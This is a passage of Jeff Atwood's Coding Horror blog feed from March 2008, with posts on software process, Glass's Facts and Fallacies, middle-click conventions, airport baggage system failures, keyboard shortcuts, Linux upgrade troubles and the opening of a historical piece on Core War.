I think sometimes programmers forget how much work it is to create software at large companies. What may seem like a no-brainer five line code change to us on the outside is perhaps five man-weeks of work once you factor in all the required process overhead. We're picking on Microsoft here, but this is by no means limited to Microsoft; it's a simple function of scale and audience for all commercial software.
</p>
<p>
So then, the obvious question: <b>who does all those things for non-commercial, open source software?</b> The answer, per a Raymond Chen comment on the same post, is "nobody":
</p>
<p>
</p>
<blockquote>
Who develops the test plans for open source software? Who updates the screenshots in the user's guide and online help? And who translates the documentation into Polish and Turkish? Who verifies that the feature doesn't violate the Americans with Disabilities Act or German privacy laws? Back when I worked on Linux, the answer was "Nobody. There is no test plan, there is no printed user's guide, what little documentation there is exists only in English, and nobody cares about complying with the ADA or German privacy laws." Maybe things have changed since then.
</blockquote>
<p>
Here's my honest question: does open source software <i>need</i> all that process to be successful? <b>Isn't the radical lack of process baggage in open source software development not a weakness, but in fact an evolutionary advantage?</b> What open source software lacks in formal process it makes up ten times over in ubiquity and community. In other words, if the Elbonians feel so strongly about localization, they can take that effort on themselves. Meanwhile, the developers have more time to implement features that delight the largest base of customers, instead of plowing through mountains of process for every miniscule five line code change.
</p>
<p>
Are large commercial software companies <a href="http://minimsft.blogspot.com/2005/06/recent-random-bits.html">crippled by their own process</a>?
</p>
<p>
</p>
<blockquote>
If you openly reward and promote people for killing work by bemoaning the risk and the testing cost and localization impact of each feature and interrogating a design change request as if it were Dan Brown shackled in-front of a wild-eyed, hot-poker wielding Pope, well, everyone is going to grab pitchforks and jump on that "No can do! No can ship!" bandwagon.
<p>
It makes me think of how many feature meetings I've had and what a small percent of those features have actually ever shipped. Not that every feature is a good idea, but it's damn near wake-worthy sometimes for a feature to actually get out into shipping bits. Que <a href="http://en.wikipedia.org/wiki/Eeyore">Eeyore</a>: "Oh no. Now we have to support it. I suppose a hotfix request will come in any moment now..."
</p>
</blockquote>
<p>
All too often, <b>it really does feel like Microsoft's software was designed by Eeyore</b>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
In this case, the bird represents features that delight customers.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-24T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/is-eeyore-designing-your-software/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Revisiting The Facts and Fallacies of Software Engineering ]]></title>
<link>https://blog.codinghorror.com/revisiting-the-facts-and-fallacies-of-software-engineering/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I like to re-read my favorite books every few years, so I brought Robert Glass' seminal <a href="http://www.amazon.com/exec/obidos/ASIN/0321117425/codihorr-20%0A">Facts and Fallacies of Software Engineering</a> with me on my most recent trip. I thought it was a decent, but imperfect read when I originally bought it in 2004. As I scanned through the introduction and table of contents, I realized that <b>I've written about almost everything in this book by now</b>.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/0321117425/codihorr-20%0A"><img alt="image placeholder" >
</a>
</p>
<p>
I'm not sure I gave Facts and Fallacies its due <a href="http://www.codinghorror.com/blog/archives/000084.html">on my first read</a>.
</p>
<p>
Simply reciting the various facts and fallacies feels like a zen koan to software engineering. Even without any of the background discussion and explanation in the book, it's therapeutic to ponder the brief one sentence summaries presented in the table of contents. As you read these, what comes to mind, based on your experience?
</p>
<p>
<b>People</b>
</p>
<ol>
<li>The most important factor in software work is the quality of the programmers.
</li>
<li>The best programmers are up to 28 times better than the worst programmers.
</li>
<li>Adding people to a late project makes it later.
</li>
<li>The working environment has a profound impact on productivity and quality.
</li>
</ol>
<p>
<b>Tools and Techniques</b>
</p>
<ol start="5">
<li>Hype (about tools and technology) is a plague on the house of software.
</li>
<li>New tools and techniques cause an initial <i>loss</i> of productivity / quality.
</li>
<li>Software developers talk a lot about tools, but seldom use them.
</li>
</ol>
<p>
<b>Estimation</b>
</p>
<ol start="8">
<li>One of the two most common causes of runaway projects is poor estimation.
</li>
<li>Software estimation usually occurs at the wrong time.
</li>
<li>Software estimation is usually done by the wrong people.
</li>
<li>Software estimates are rarely corrected as the project proceeds.
</li>
<li>It is not surprising that software estimates are bad. But we live and die by them anyway!
</li>
<li>There is a disconnect between software management and their programmers.
</li>
<li>The answer to a feasability study is almost always "yes".
</li>
</ol>
<p>
<b>Reuse</b>
</p>
<ol start="15">
<li>Reuse-in-the-small is a solved problem.
</li>
<li>Reuse-in-the-large remains a mostly unsolved problem.
</li>
<li>Reuse-in-the-large works best in families of related systems.
</li>
<li>Reuseable components are three times as hard to build and should be tried out in three different settings.
</li>
<li>Modification of reused code is particularly error-prone.
</li>
<li>Design pattern reuse is one solution to the problems of code reuse.
</li>
</ol>
<p>
<b>Requirements</b>
</p>
<ol start="23">
<li>One of the two most common causes of runaway projects is unstable requirements.
</li>
<li>Requirements errors are the most expensive to fix during production.
</li>
<li>Missing requirements are the hardest requirements errors to correct.
</li>
</ol>
<p>
<b>Design</b>
</p>
<ol start="26">
<li>Explicit requirements 'explode' as implicit requirements for a solution evolve.
</li>
<li>There is seldom one best design solution to a software problem.
</li>
<li>Design is a complex, iterative process. Initial design solutions are usually wrong and certainly not optimal.
</li>
</ol>
<p>
<b>Coding</b>
</p>
<ol start="29">
<li>Designer 'primitives' rarely match programmer 'primitives'.
</li>
<li>COBOL is a very bad language, but all the others are so much worse.
</li>
</ol>
<p>
<b>Error removal</b>
</p>
<p>
</p>
<ol start="31">
<li>Error removal is the most time-consuming phase of the lifecycle.
</li>
</ol>
<p>
<b>Testing</b>
</p>
<ol start="32">
<li>Software is usually tested at best to the 55 to 60 percent coverage level.
</li>
<li>100 percent test coverage is still far from enough.
</li>
<li>Test tools are essential, but rarely used.
</li>
<li>Test automation rarely is. Most testing activities cannot be automated.
</li>
<li>Programmer-created, built-in debug code is an important supplement to testing tools.
</li>
</ol>
<p>
<b>Reviews and Inspections</b>
</p>
<p>
</p>
<ol start="37">
<li>Rigorous inspections can remove up to 90 percent of errors before the first test case is run.
</li>
<li>Rigorous inspections should not replace testing.
</li>
<li>Post-delivery reviews, postmortems, and retrospectives are important and seldom performed.
</li>
<li>Reviews are both technical and sociological, and both factors must be accommodated.
</li>
</ol>
<p>
<b>Maintenance</b>
</p>
<p>
</p>
<ol start="41">
<li>Maintenance typically consumes 40 to 80 percent of software costs. It is probably the most important software lifecycle phase.
</li>
<li>Enhancements represent roughly 60 percent of maintenance costs.
</li>
<li>Maintenance is a solution-- not a problem.
</li>
<li>Understanding the existing product is the most difficult maintenance task.
</li>
<li>Better methods lead to <i>more</i> maintenance, not less.
</li>
</ol>
<p>
<b>Quality</b>
</p>
<ol start="46">
<li>Quality is a collection of attributes.
</li>
<li>Quality is <i>not</i> user satisfaction, meeting requirements, achieving cost and schedule, or reliability.
</li>
</ol>
<p>
<b>Reliability</b>
</p>
<p>
</p>
<ol start="48">
<li>There are errors that most programmers tend to make.
</li>
<li>Errors tend to cluster.
</li>
<li>There is no single best approach to software error removal.
</li>
<li>Residual errors will always persist. The goal should be to minimize or eliminate <i>severe</i> errors.
</li>
</ol>
<p>
<b>Efficiency</b>
</p>
<p>
</p>
<ol start="52">
<li>Efficiency stems more from good design than good coding.
</li>
<li>High-order language code can be about 90 percent as efficient as comparable assembler code.
</li>
<li>There are tradeoffs between optimizing for time and optimizing for space.
</li>
</ol>
<p>
<b>Research</b>
</p>
<ol start="55">
<li>Many researchers advocate rather than investigate.
</li>
</ol>
<p>
I had forgotten how much ground the book covers; it's a perfect springboard to all the essential topics in software engineering.
</p>
<p>
I've posted on almost every one of these facts in the intervening four years since I originally read them. As I delved into the table of contents presented above, I could barely contain myself. I remembered and mentally checked each post off the list as I went: check, check, check. I've been accused of gratuitous self-linking in the past, so I won't clutter up the rules with dozens of links to my old posts on these topics. If you're interested, you can find it. That's sort of the point.
</p>
<p>
If those are the fifty-five facts, then these are the <b>ten fallacies</b> presented at the end. Fallacies have the <i>ring</i> of truth, but upon closer inspection, turn out to be problematic when applied to a real live software project.
</p>
<p>
</p>
<ol>
<li>You can't manage what you can't measure.
</li>
<li>You can manage quality into a software product.
</li>
<li>Programming can and should be egoless.
</li>
<li>Tools and techniques: one size fits all.
</li>
<li>Software needs more methodologies.
</li>
<li>To estimate cost and schedule, first estimate lines of code.
</li>
<li>Random test input is a good way to optimize testing.
</li>
<li>"Given enough eyeballs, all bugs are shallow".
</li>
<li>The way to preduct future maintenance costs and to make product replacement decisions is to look at past cost data.
</li>
<li>You teach people how to program by showing them how to <i>write</i> programs.
</li>
</ol>
<p>
If you're curious about the rationale behind these facts and fallacies, that's entirely the reason the book exists: to remind us to question what we're doing. <b>We should be thinking about our craft every day, in some small way, on our own software projects.</b> That's how we collectively advance software engineering-- by building our shared memory and history in the field. As Mr. Glass states in the introduction:
</p>
<p>
</p>
<blockquote>
In presenting these facts, I am also indentifying problems in the field. It is not my intention to present solutions to these problems. <a href="http://www.codinghorror.com/blog/archives/000189.html">This is a what-is book, not a how-to book</a>. That's important to me. I want to bring these facts into the open, where they can be freely discussed, and we can act on them to make progress.
</blockquote>
<p>
I encourage you to <a href="http://www.codinghorror.com/blog/archives/000084.html">pick up a copy of the full book</a> for a deeper exploration. I do believe there's a rich learning experience-- or a rich remembering experience-- here for those of you who choose to read on.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-25T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/revisiting-the-facts-and-fallacies-of-software-engineering/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ I {entity} Unicode ]]></title>
<link>https://blog.codinghorror.com/i-entity-unicode/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
These are available as <a href="http://www.cafepress.com/nucleartacos/317769">bumper stickers and t-shirts</a>:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Here's my rhetorical question to you: <i>why is this funny?</i>
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.joelonsoftware.com/articles/Unicode.html">The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets (No Excuses!)</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000178.html">There Ain't No Such Thing as Plain Text</a>
</li>
<li>
<a href="http://www.tbray.org/ongoing/When/200x/2003/04/06/Unicode">On the Goodness of Unicode</a>
</li>
<li>
<a href="http://en.wikipedia.org/wiki/Unicode">Wikipedia article on Unicode</a>
</li>
</ul>
<p>
Here's hoping the next programmer who sees this is laughing, too-- and for the right reasons.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-26T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/i-entity-unicode/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ What Should The Middle Mouse Button Mean? ]]></title>
<link>https://blog.codinghorror.com/what-should-the-middle-mouse-button-mean/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Despite Apple's historical insistence that the computer mouse should only have one button-- which led to <a href="http://www.codinghorror.com/blog/archives/000096.html">the highly unfortunate convention of double-clicking</a>-- most mice have more than one button today. In his classic book <a href="http://www.amazon.com/exec/obidos/ASIN/0201379376/codihorr-20">The Humane Interface</a>, Jef Raskin revisits the earliest days of his involvement with the Mac project and realizes that the single button mouse was a mistake. <b>Mice were meant to have multiple buttons</b>.
</p>
<p>
</p>
<blockquote>
What I did not see at the time is that multiple buttons on a mouse can work well if the buttons are labeled. If the Macintosh mouse had had multiple buttons, if the buttons had been permanently labeled, and if they had only been used for their intended function, <b>a multiple mouse button might have been a better choice.</b> A better mouse might have two buttons, marked Select and Activate, on top and on the side, a button activated by a squeezing action of the thumb. This last button would be marked Grab. Some mice at present have a scroll wheel on top that is used primarily for scrolling. Better still would be a small trackball in that location. The mouse would control the position of the cursor; the trackball could be used, for example, to manipulate objects or to make selections from menus that float with the cursor.
</blockquote>
<p>
Doug Engelbart, the <a href="http://www.codinghorror.com/blog/archives/000286.html">inventor of the mouse</a>, also thinks that <a href="http://www.engadget.com/2005/11/16/doug-engelbart-sez-mice-should-have-many-buttons/">mice should have multiple buttons</a>:
</p>
<p>
</p>
<blockquote>
[Doug Engelbart] believes a mouse should have many buttons ... the only reason his original mouse design didn't have more than three was because they didn't have the technology at the time to make that possible.
</blockquote>
<p>
Apple didn't ship a multiple button mouse until the <a href="http://en.wikipedia.org/wiki/Apple_Mighty_Mouse">Mighty Mouse</a> was released in August 2005. It has four effective buttons, and even sports the trackball that Jef Raskin imagined in his book five years earlier. However, I've <a href="http://www.google.com/search?q=mighty+mouse+sucks">read a lot of complaints about the Mighty Mouse</a>, most of which stem from the substitution of actual <i>buttons</i> with touch-sensitive surfaces.
</p>
<p>
I've used two-button mice as far back as I can remember on the PC. The meaning of the first two mouse buttons are very well defined in every graphical user interface by now:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td><b>Left click</b></td>
<td>select or activate an item</td>
</tr>
<tr>
<td><b>Right click</b></td>
<td>show contextual menu for an item</td>
</tr>
</table>
<p>
But modern mice actually have at least three buttons. Where's the third button? <b>Right under your mouse wheel.</b>
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Mouse wheels have been <a href="http://www.codinghorror.com/blog/archives/000865.html">commonly available since 1996</a>. In all those years, all those millions of mice shipped, <b>no standard convention has emerged for what it <i>means</i> to press the middle mouse button.</b>
</p>
<p>
Over the last two or three years, <b>middle click has become strongly associated with tabbed user interfaces</b>, at least in popular web browsers. Middle-clicking over a link opens it in a new tab; middle-clicking the tab itself closes that tab. This is happening in enough applications now that I think it's fair to call opening and closing tabs with the middle button an <i>emerging convention</i>. Still, it's a fairly loose convention, and the behavior is only defined for links and tabs respectively, and only in certain applications. What happens the rest of the time when you middle-click?
</p>
<p>
Another odd middle-click behavior that's defined in both Internet Explorer and Firefox is <b>the modal "autoscroll mode"</b>. Middle click once on the page to activate this mode. Notice that the cursor changes. You can now use the mouse to determine the rate of scrolling. Middle-clicking again releases this mode and reverts to the normal mouse cursor.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I personally hate this behavior. I prefer to scroll explicitly with the wheel, and I often trigger this unwanted "mode" when I've slightly missed middle-clicking on a link. It can be turned off in the advanced options of Firefox but I can find no way to turn it off in Internet Explorer.
</p>
<p>
In the UNIX and <a href="http://en.wikipedia.org/wiki/X_Window_System">X Windows</a> world, the middle button has also meant <b>paste</b> since way, way back in the 1980s. I can't find any evidence of this behavior on Windows or the Mac, however. Pasting into text areas wouldn't necessarily conflict with the tab behavior, but it's an odd hodgepodge of behaviors to attach to a single button.
</p>
<p>
I hope over the next few years Microsoft and Apple can <b>decide on a set of standard middle mouse button behaviors</b>. It's frustrating to me that millions and millions of mice have shipped with this button, and yet it's a total crapshoot what will happen when you press the middle mouse button in any given application under any operating system. <b>If the first and second mouse buttons have standard, well-defined meanings today-- why can't the third button, too?</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-27T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/what-should-the-middle-mouse-button-mean/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Just a Little Bit of Software History Repeating ]]></title>
<link>https://blog.codinghorror.com/just-a-little-bit-of-software-history-repeating/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I lived in the Denver area at the time <a href="http://en.wikipedia.org/wiki/Denver_International_Airport">Denver International Airport's</a> completely computer automated baggage system was unveiled in 1994. The <a href="http://www.nytimes.com/2005/08/27/national/27denver.html?pagewanted=2&amp;_r=1">troubled development of this system</a> was big local news.
</p>
<p>
</p>
<blockquote>
The premise of Denver's plan was as big as the West. The distance from a centralized baggage check-in to the farthest gate - about a mile - dictated expansive new thinking, planners said, and technology would make the new airport a marvel. Travelers who arrived for check-in or stepped off a plane would have their bags whisked across the airport with minimal human intervention. The result would be fewer flight delays, less waiting at luggage carousels and big savings in airline labor costs.
<p>
Tours that preceded the system's debut led invariably to an airport basement where 26 miles of track, loaded with thousands of small gray carts, sped bags up and down inclines as conveyor belts minutely timed by the computer deposited each bag in its cart at just the right moment.
</p>
</blockquote>
<p>
The baggage system was an abject failure. It had huge problems on opening day, and almost immediately had to be superseded  by manual procedures. Things never improved much from there. Denver's automated baggage handling system was scrapped completely by 2005, in favor of traditional manual handling and barcode scanning procedures.
</p>
<p>
</p>
<blockquote>
"It wasn't the technology per se, it was a misplaced faith in it," said Richard de Neufville, a professor of civil and environmental engineering and engineering systems at the Massachusetts Institute of Technology. Professor de Neufville said the builders had imagined that their creation would work well even at the busiest boundaries of its capacity. That left no room for the errors and inefficiencies that are inevitable in a complex enterprise.
<p>
<b>"The main culprit was hubris,"</b> he said.
</p>
</blockquote>
<p>
I was surprised, then, to read <a href="http://www.thisislondon.co.uk/news/article-23466287-details/Terminal+disgrace%3A+Fights+break+out+among+queuing+passengers+as+Heathrow+opening+descends+into+chaos/article.do">essentially the same scenario play out 10 years later</a> in England at Heathrow Airport's new Terminal 5.
</p>
<p>
</p>
<blockquote>
Many things did not go according to plan at T5, but at the core of the fiasco is baggage. This is supposed to be a state-of-the-art system, the biggest in Europe with 10 miles of conveyor belts controlled by 140 computers and designed to process 12,000 bags per hour at up to 23 mph. But it had never been tested before in a live terminal. On T5's D-Day many aspects -- human and technological -- simply did not work.
<p>
BA say they are confident that a few days bedding-down will sort out the problems. However, T5 is not yet at full capacity, with another 70 long-haul destinations due to move there on 30 April.
</p>
</blockquote>
<p>
I sincerely hope BA can <a href="http://www.codinghorror.com/blog/archives/000889.html">escape from Gilligan's Island</a>, unlike so many hardy travellers before them. Otherwise, all we'll end up with is another sad entry in <a href="http://www.codinghorror.com/blog/archives/000588.html">the long, dismal history of software project failure</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-29T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/just-a-little-bit-of-software-history-repeating/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Revisiting &quot;Keyboard vs. The Mouse, pt 1&quot; ]]></title>
<link>https://blog.codinghorror.com/revisiting-keyboard-vs-the-mouse-pt-1/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
You may know <a href="http://en.wikipedia.org/wiki/Bruce_Tognazzini">Bruce Tognazzini</a> from his days as Apple Computer employee #66, or perhaps his classic books <a href="http://www.amazon.com/exec/obidos/ASIN/0201608421/codihorr-20">Tog on Interface</a> and <a href="http://www.amazon.com/exec/obidos/ASIN/0201489171/codihorr-20">Tog on Software Design</a>. He's still quite relevant today; his list of the <a href="http://www.codinghorror.com/blog/archives/000184.html">ten most persistent UI bugs</a> is an excellent reminder that many of the biggest computer interface problems are still essentially unsolved.
</p>
<p>
But what I want to talk about today is one particular Ask Tog column from August 1989, which was republished as Chapter 6 of his book <a href="http://www.amazon.com/exec/obidos/ASIN/0201608421/codihorr-20">Tog on Interface</a>. It's titled <a href="http://www.asktog.com/TOI/toi06KeyboardVMouse1.html">Keyboard <em>vs.</em> The Mouse, pt 1</a>. It contains this quote:
</p>
<blockquote>
We've done a cool $50 million of R &amp; D on the Apple Human Interface. We discovered, among other things, two pertinent facts:
<ul>
<li>Test subjects consistently report that keyboarding is faster than mousing.
</li>
<li>The stopwatch consistently proves mousing is faster than keyboarding.
</li>
</ul>
<p>
This contradiction between user-experience and reality apparently forms the basis for many user/developers' belief that the keyboard is faster.
</p>
</blockquote>
<p>
Let's assume that we're typing some text into a document of some kind, and we wish to save the document we're working on. (I could argue that <a href="http://www.codinghorror.com/blog/archives/000075.html">the user should never have to explicitly save anything</a>, but humor me.) If it <strong>seems ridiculous</strong> that the mouse method:
</p>
<ol>
<li>Take your right hand off the keyboard
</li>
<li>Place your right hand on the mouse
</li>
<li>Mouse over to the File menu
</li>
<li>Click File
</li>
<li>Click Save
</li>
<li>Place your right hand back on the keyboard
</li>
</ol>
<p>
Could be measurably faster than the keyboard method:
</p>
<ol>
<li>Use your left hand to press <kbd>Ctrl</kbd> + <kbd>S</kbd>
</li>
</ol>
<p>
I assure you that you are not alone. Please defer all your righteous indignation for just a moment.
</p>
<p>
First, understand that this is a very old quote. In 1989, the current desktop operating systems were Windows 2.0, DOS 4.0, and Mac System 6. The "people new to the mouse" Tog refers to were keyboard holdouts, convinced that the mouse was nothing more than a giant, gimmicky waste of time. I don't think you'll find many users like that around today. Furthermore, I doubt Tog envisioned today's world of main menus with literally thousands of commands, a menu tree – no, a menu <em>forest</em> – so dense that search or some other <a href="http://www.codinghorror.com/blog/archives/000397.html">alternate UI metaphor</a> is the only rational way to navigate it all.
</p>
<p>
This ancient quote is invariably trotted out during any discussion of keyboard shortcuts, and always <strong>for the wrong reasons</strong>. The first paragraph is all most people read, so they misunderstand the full meaning. It helps to read the entire column. Tog explains keyboard shortcuts the way <em>modern</em> users understand them just a few short paragraphs later:
</p>
<blockquote>
And, in fact, I find myself on the opposite side in at least one instance, namely editing. By using <kbd>Cmd</kbd>+<kbd>X</kbd>, <kbd>C</kbd>, and <kbd>V</kbd>, the user can select with one hand and act with the other. Two-handed input. Two-handed input can result in solid productivity gains (Buxton 1986).
</blockquote>
<p>
I don't think anyone would argue that learning keyboard shortcuts is faster than using the mouse to navigate and learn a program. Clearly it isn't – it's quite painful, as anyone who has ever been stranded at a Unix command prompt can probably tell you.
</p>
<p>
However, as Tog himself notes, <strong>when the keyboard shortcut is already memorized and well understood, it's a clear productivity win</strong>.
</p>
<p>
I've long been an advocate of <strong>two-fisted computing</strong> – <a href="http://www.codinghorror.com/blog/2007/03/going-commando---put-down-the-mouse.html">using both your keyboard <em>and</em> your mouse to the fullest</a>. That's what keyboard shortcuts are to me. I'm not sure why this always has to be spun as <a href="http://www.youtube.com/watch?v=3hQC3nkftrk">a cage match</a> between the keyboard and the mouse.  Keyboard shortcuts don't replace my mousing; they <em>complement</em> it.
</p>
<p>
In my experience, there's absolutely no question that judicious use of a few keyboard shortcuts will make you faster and more productive. But you don't have to take it from me. Just <a href="http://www.asktog.com/TOI/toi06KeyboardVMouse1.html">Ask Tog</a>.
</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-30T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/revisiting-keyboard-vs-the-mouse-pt-1/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Let That Be a Lesson To You, Son: Never Upgrade. ]]></title>
<link>https://blog.codinghorror.com/let-that-be-a-lesson-to-you-son-never-upgrade/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
(<font color="red">Update:</font> This piece originally ran on April Fools' day; although the content of the post is <i>not</i> an April Fools' joke, the retro styling definitely was. <a href="http://www.codinghorror.com/blog/images/coding-horror-april-1-2008.png">View a screenshot</a> of how this post looked on April 1, 2008)
</p>
<p>
I occasionally follow <a href="http://jwz.livejournal.com/">Jamie Zawinski's blog</a>. Jamie's an interesting guy. In the process of researching <a href="http://www.codinghorror.com/blog/archives/001046.html">an earlier post</a>, I discovered that he played a significant role in unearthing the classic <a href="http://www.codinghorror.com/blog/archives/000047.html">Worse is Better</a> paper:
</p>
<p>
</p>
<blockquote>
About a year later [1991] we hired a young kid from Pittsburgh named Jamie Zawinski. He was not much more than 20 years old and came highly recommended by Scott Fahlman. We called him "The Kid." He was a lot of fun to have around: not a bad hacker and definitely in a demographic we didn't have much of at Lucid. He wanted to find out about the people at the company, particularly me since I had been the one to take a risk on him, including moving him to the West Coast. His way of finding out was to look through my computer directories - none of them were protected. He found the EuroPAL paper, and found the part about worse is better. He connected these ideas to those of Richard Stallman, whom I knew fairly well since I had been a spokesman for the League for Programming Freedom for a number of years. JWZ excerpted the worse-is-better sections and sent them to his friends at CMU, who sent them to their friends at Bell Labs, who sent them to their friends everywhere.
</blockquote>
<p>
Or, perhaps you've read the classic <a href="http://norvig.com/21-days.html">Teach Yourself Programming in Ten Years</a>? That was written by Peter Norvig, who is now the director of research at Google. It refers to Mr. Zawinski thusly:
</p>
<p>
</p>
<blockquote>
One of the best programmers I ever hired had only a High School degree; he's produced a lot of great software, has his own news group, and made enough in stock options to buy his own nightclub.
</blockquote>
<p>
I think you'll agree that it's fair to call Jamie Zawinski a world class software engineer. Jamie's blog documents, in great detail, how he runs his <a href="http://www.dnalounge.com/">DNA Lounge</a> club in San Francisco. It's a great read, full of fascinating, often geeky backstage details. The DNA Lounge is powered by open source software, including various flavors of Linux. Sometimes this can be painful. In 2006, Jamie ran into <a href="http://www.dnalounge.com/backstage/log/2006/04.html">serious problems with the Linux sound architecture</a>:
</p>
<p>
</p>
<blockquote>
You may have noticed that the audio archives have only had one channel for the last few weeks. You would probably assume that's a simple matter of replacing a cable; turns out, not. As far as we can tell, the audio going into the computer is stereo, and somewhere in there, it drops (most of) the right channel. So, bad connector, right? No, we've tried four different sound cards, and checked the mixer settings. At this point it seems like the last time we (accidentally) <a href="https://bugzilla.redhat.com/show_bug.cgi?id=179639">upgraded ALSA</a>, it introduced some software bug that is making one channel go away. I can't even fathom how such a bug could exist, but that's Linux for you.
<p>
We seem to have solved the "missing right channel" problem. It was, in fact, a software problem. We were running Fedora 4, and when we installed the latest patches on March 31, that's when the right channel vanished. We tried downgrading to the version of the kernel and ALSA as of three months ago, and that didn't fix it. But, Jonathan took all the sound cards home and tried them in his machine, and they all worked fine there. He was running Fedora 5. So we upgraded to that, and the problem went away.
</p>
<p>
That's right: upgrading to the latest FC4: breaks the world. Giving up on FC4 and going to FC5: un-breaks it. Nicely done, guys.
</p>
<p>
For years I've had it drummed into my head that you always have to keep your systems patched, if you aren't running the latest security fixes, the script kiddies will eat you alive, running a six month old OS is like leaving your front door wide open, blah blah blah. Well you know what? <b>F**k that noise. I'm done upgrading anything ever</b>. The next time I get this s**t into a state that seems even remotely stable, I'm never touching it again. If we get hacked, oh well. I have backups. It has got to be less work to recover from than constantly dealing with this kind of nonsense.
</p>
</blockquote>
<p>
The DNA lounge provides <a href="http://www.dnalounge.com/webcast/">streaming audio and video webcasts of whatever is going on</a> any time the club is open. So problems like this are especially troubling -- Jamie's business depends on this stuff working.
</p>
<p>
I was particularly disturbed to find <a href="http://www.dnalounge.com/backstage/log/2008/03.html#26">this recent entry</a>:
</p>
<p>
</p>
<blockquote>
I spent a solid four days trying to upgrade the kiosks from Red Hat 9 + LTSP 4.3 (vintage 2003) to... something newer. In this case, Ubuntu 10.7 + LTSP 5, since it seems like that's what the cool kids are running these days. Why would I do such a thing? Well, one reason is that the Firefox 3 beta would neither install nor compile on RH9 (missing libraries), and another was that the kiosks are a little crashy (they reboot themselves pretty regularly for no adequately explored reason), and also, it's "just kinda old", which some people will tell you might mean, maybe, kinda, less secure. So I figured I'd give it a shot.
<p>
Well, since this is not my first rodeo, when I say "upgrade" what I really mean is "do a fresh install on a spare drive."
</p>
<p>
So, after four days of this nonsense, I gave up, and just put the old drive back in. "Nonsense" in this case is defined as: the upgrade made the machines be even crashier than before (they can barely stay up for an hour) and it's a far worse kind of crashy: it's the kind of crashy where you have to press the shiny red button to make them come back to life, instead of them being able to do that themselves.
</p>
<p>
So, f**k it. <b>They'll be running a 2003 version of Linux forever</b>, because I frankly have better things to do with my time.
</p>
</blockquote>
<p>
I can't fault Jamie's approach. A clean install of an operating system on a new hard drive -- for kiosks running controlled hardware, no less -- that's as good as it gets.
</p>
<p>
Apparently, <b>Linux is so complex that even a world class software engineer can't always get it to work</b>.
</p>
<p>
I find it highly disturbing that a software engineer of Jamie's caliber would give up on upgrading software. Jamie lives and breathes Linux. It is his platform of choice. If he throws in the towel on Linux upgrades, then what <i>possible</i> hope do us mere mortals have?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-31T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/let-that-be-a-lesson-to-you-son-never-upgrade/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Core War: Two Programs Enter, One Program Leaves ]]></title>
<link>https://blog.codinghorror.com/core-war-two-programs-enter-one-program-leaves/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Our <a href="http://www.codinghorror.com/blog/archives/000954.html">old pal A. K. Dewdney</a> first introduced the world to <a href="http://en.wikipedia.org/wiki/Core_War">Core War</a> in a <a href="http://www.koth.org/info/akdewdney/">series of Scientific American articles</a> starting in 1984. (Full page scans of the articles, including the illustrations, are <a href="http://www.corewars.org/sciam/">also available</a>.)
</p>
<p>
</p>
<blockquote>
Core War was inspired by a story I heard some years ago about a mischievous programmer at a large corporate research laboratory I shall designate X. The programmer wrote an assembly-language program called Creeper that would duplicate itself every time it was run. It could also spread from one computer to another in the network of the X corporation. The program had no function other than to perpetuate itself. Before long there were so many copies of Creeper that more useful programs and data were being crowded out. The growing infestation was not brought under control until someone thought of fighting fire with fire. A second self-duplicating program called Reaper was written. Its purpose was to destroy copies of Creeper until it could find no more and then to destroy itself. Reaper did its job, and things were soon back to normal at the X lab.
<p>
(The story of Creeper and Reaper seems to be based on a compounding of two actual programs. One program was <a href="http://en.wikipedia.org/wiki/Darwin_%28programming_game%29">a computer game called Darwin</a>, invented by M. Douglas McIlroy of AT&amp;T Bell Laboratories. The other was called Worm and was written by John F. Shoch of the Xerox Palo Alto Research Center. Both programs are some years old, allowing ample time for rumors to blossom.)
</p>
</blockquote>
<p>
